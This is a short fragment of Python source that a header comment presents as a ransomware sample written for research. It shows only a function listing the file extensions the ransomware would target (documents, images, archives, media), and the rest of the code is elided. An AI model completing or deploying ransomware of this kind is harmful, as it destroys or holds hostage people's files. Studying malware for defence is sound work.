#This ransomware sample virus file is written by Muhammad Abdul Latif for research purpose 
...
def filelist():
    mylist = [".txt",".pdf","png","jpg","docx","doc","xls", "xlsx", "ppt","pptx","rar","zip",".mp3",".wmv",".mp4"]
